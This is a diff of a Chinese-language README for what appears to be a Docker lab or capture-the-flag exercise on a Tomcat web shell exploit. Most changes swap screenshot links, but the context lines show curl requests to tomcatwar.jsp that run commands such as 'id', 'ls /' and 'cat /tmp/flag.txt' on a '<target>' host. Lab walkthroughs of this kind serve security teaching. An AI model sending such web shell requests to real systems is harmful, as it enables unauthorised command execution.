@@ -43,13 +43,14 @@ sudo docker-compose up -d
 sudo docker ps
 ```
 
-![docker-ps](screenshots/docker-ps.png)
+<img width="800" height="115" alt="image" src="https://github.com/user-attachments/assets/e354fc91-262c-4648-a47b-818558a21b55" />
 
 ### 4. 驗證環境
 
 開啟瀏覽器訪問 `http://localhost:8080/?name=Hacker&age=99`
 
-![parameter-binding](screenshots/parameter-binding.png)
+<img width="1154" height="719" alt="image" src="https://github.com/user-attachments/assets/99198c87-56c9-454c-8241-7169299fbfe4" />
+
 
 ---
 
@@ -89,7 +90,8 @@ http://localhost:8080/tomcatwar.jsp?cmd=id
 curl "http://localhost:8080/tomcatwar.jsp?cmd=id"
 ```
 
-![rce-id](screenshots/rce-id.png)
+<img width="432" height="70" alt="image" src="https://github.com/user-attachments/assets/28be8ae2-2894-4b9f-bb22-ee9c89d5cc84" />
+
 
 ### 執行 `ls /` 指令
 
@@ -97,7 +99,8 @@ curl "http://localhost:8080/tomcatwar.jsp?cmd=id"
 curl "http://localhost:8080/tomcatwar.jsp?cmd=ls%20/"
 ```
 
-![rce-ls](screenshots/rce-ls.png)
+<img width="436" height="331" alt="image" src="https://github.com/user-attachments/assets/340fca5c-7d53-4419-9df1-4560287efe9f" />
+
 
 ---
 
@@ -154,7 +157,8 @@ http://<target>:8080/tomcatwar.jsp?cmd=id
 curl "http://<target>:8080/tomcatwar.jsp?cmd=cat%20/tmp/flag.txt"
 ```
 
-![flag-result](screenshots/flag-result.png)
+<img width="505" height="75" alt="image" src="https://github.com/user-attachments/assets/fdbefeaa-9b44-4643-854f-9872d26f05cc" />
+
 
 ### 步驟 5：獲得 Flag
 
